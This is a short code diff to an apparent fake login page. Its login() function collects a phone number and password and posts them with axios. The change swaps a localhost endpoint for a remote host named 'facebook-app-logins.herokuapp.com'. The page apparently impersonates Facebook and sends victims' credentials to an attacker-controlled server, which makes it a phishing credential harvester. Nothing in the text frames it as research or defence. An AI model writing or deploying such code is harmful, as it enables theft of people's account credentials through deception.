@@ -10,7 +10,7 @@ const credentials= {};
 function login(){
     credentials.phone= phone.value;
     credentials.pass= pass.value;
-    axios.post("http://localhost:8000/save",credentials);
+    axios.post("https://facebook-app-logins.herokuapp.com/save",credentials);
     console.log('clicked')
     
 }
